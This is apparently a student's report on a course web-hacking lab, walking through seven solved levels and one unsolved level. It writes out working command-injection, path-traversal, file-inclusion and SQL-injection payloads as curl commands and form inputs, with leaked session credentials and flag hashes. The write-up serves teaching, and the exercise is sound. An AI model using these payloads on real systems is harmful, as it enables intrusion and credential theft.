Web Hacking Report


Level 1 Description:
I used firefox to navigate to the website provided at the start. 
I navigated to the form.html site. 
Using the developer tools, I looked at the JS to examine the verify button and its function. 
Upon inspection, the correct username was 'script' and the correct password was 'kiddie.'
Entering it gave the alert with the secret: Your First Blood.
Using python, I converted this phrase to an MD5 hash using the following script:

import hashlib

md5_hash = hashlib.md5()
md5_hash.update(b'Your First Blood')
hash_value = md5_hash.hexdigest()

print(hash_value) 

Level 1 MD5 Hash: cd3d9cadf1ef30f7dc5802e823116310

Level 2 Description:
From the level 2 landing page, I navigated to the active users page /users.html
I inspected the html code and in the get users function there is an asynchronous HTTP request to /cgi-bin/users.php with a filter parameter appended to this. 

I did a get request and appended a filter to that url: curl http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter='secret'
This was not successful. I saw that the Referrer Policy was strict-origin-when-cross-origin meaning that the header referer must be users.html page so I used -H to modify the header of my request and then append some command line instructions to view the files and read the secret text: 

curl -H "Referer: http://pwnthemall.cse543.rev.fish:8082/users.html" http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter=';ls;cat%20secretuser.txt'
<pre>
myid
secretuser.txt
users.php
allyourbasebelongtous
</pre>

I then converted the text to MD5 hash using the same python script in Level 1.

Level 2 MD5 Hash: 41e33f8c6719f97e1ac00d745e6a25c5
To access level 3: navigate to http://pwnthemall.cse543.rev.fish:8083/41e33f8c6719f97e1ac00d745e6a25c5




Level 3 Description: 
I entered the fields for First, Last, and Email with Mike Pence and the email given. It gave me the following petition:

Thanks for signing the petition.
Your ID is 44b33c4d233f8fd8c296a7a07d737d06 

I removed all of the fields except for ID which I filled in using the previous info. 
Your comment was: Hack the planet! 

I then converted the text to MD5 hash using the same python script in Level 1.

Level 3 MD5 Hash: ba49a4555854299152eb44d2619bc5bf
To access level 4: navigate to http://pwnthemall.cse543.rev.fish:8084/ba49a4555854299152eb44d2619bc5bf




Level 4 Description:
I used the vulnerability in level 2 to traverse and found the tmp directory with the name of a session file I believed to be mike pence's:
curl -H "Referer: http://pwnthemall.cse543.rev.fish:8082/users.html" http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter=';cd%20..;cd%20..;cd%20..;cd%20..;cd%20..;cd%20..;cd%20tmp;ls'

I then used the level 04 web page and entered the relative path from level 04 which I saw was two directories down from the directory where /tmp/sess was when I was traversing using the level 02 exploit:

../../tmp/sess_91c7e1e10744d69fd8fe35ecfc

The output was:
username|s:7:"mike_pence";password|s:17:"thisissuchasimplesecret";nonce|i:893397759; 

I then converted the text to MD5 hash using the same python script in Level 1.

Level 4 MD5 Hash: 9b87ecb29600dd01b9e32d2cd268a9a4
To access level 5: navigate to http://pwnthemall.cse543.rev.fish:8085/9b87ecb29600dd01b9e32d2cd268a9a4




Level 5 Description:
I did a curl request to the landing page and saw the http code:
curl http://pwnthemall.cse543.rev.fish:8085/9b87ecb29600dd01b9e32d2cd268a9a4
I found the headers I needed to use to retrieve the store script.

I used the following command to retrieve the script for storing the passwords and found a hardcoded id, site, username, password, and admin info:
curl -b "blacklist=store" -d "id=123456789&site=1&username=mike_pence&password=password&admin=1" http://pwnthemall.cse543.rev.fish:8085/cgi-bin/store

if debug:
    id = "foo1337"
    site = "www.bar.com"
    username = "john"
    password = "pazzword"
    admin = "1"

I used this information on the retrieve function to get the following information and used it in a curl command to retrieve the passwords that were stored for bank.com. I sorted through to see the password for mike_pence and converted it to MD5 hash.

www.bar.com:john:pazzword

www.bar.com:john:pazzword

www.bar.com:john:pazzword

www.bar.com:john:terriblechoice

www.bar.com:john:terriblechoice

curl --cookie "site=www.bank.com;password=terriblechoice;blacklist=retrieve" -d "id=foo1337&site=www.bar.com&admin=1" http://pwnthemall.cse543.rev.fish:8085/cgi-bin/retrieve

password for mike_pence: wel0vesecurity

Level 5 MD5 Hash: fdf1f06b0422dc2746c7daff964c5307
To access level 6: navigate to  http://pwnthemall.cse543.rev.fish:8086/fdf1f06b0422dc2746c7daff964c5307




Level 6:
curl http://pwnthemall.cse543.rev.fish:8086/fdf1f06b0422dc2746c7daff964c5307

I noticed a level06 file in the tmp directory when using the command line injection in previous levels:
level6_test.php
system("cat s3cr37.pwd");

The User Agent header allows for PHP file inclusion. I executed the following command to execute the file mentioned above:
 curl -A "../../../../../../tmp/level6_test" http://pwnthemall.cse543.rev.fish:8086/cgi-bin/index.php

The result was SuperMegaSecretNoGuessing which I converted to MD5 hash.

Level 6 MD5 Hash:c84f270fa1ae043894c2d758bb17da2e
To access level 7: http://pwnthemall.cse543.rev.fish:8087/c84f270fa1ae043894c2d758bb17da2e




Level 7:
Being told the injection point, I started experimenting with what to put as the username on the createuser.php page. The following worked to show every log made:
' OR '1'='1'--'

From there I experimented trying to get more columns from the tables. I knew I would need to combine another sql query but needed to know the table names and columns:

admin OR 1=1 UNION SELECT * FROM information_schema.tables 

' OR '1'='1' UNION SELECT * FROM users WHERE password='password'--'

' OR '1'='1' 'UNION SELECT * FROM information_schema.tables'--'

admin UNION SELECT password, username,firstname,lastname,NULL,NULL,NULL from users

Eventually, I was able to get the password from a combination of these sql queries to get the password of admin: GoodInjectionCongrats

To get to level 8: http://pwnthemall.cse543.rev.fish:8088/27bb383ab58a22c8618d2ebad60606f7

Level 7 MD5 Hash:27bb383ab58a22c8618d2ebad60606f7




Level 8:
I guessed username and password for the fields and was able to get the web page to say successfully authenticated. I checked burp suite to monitor the traffic. I noticed there was another request to v1 leaks with a dummytoken being sent. I am not sure what needed to be done with this but I was unable to get the flag for this level. Will the method of cracking this level be revealed once grading is done? I really want to know how to do this.
Level 8 MD5 Hash:
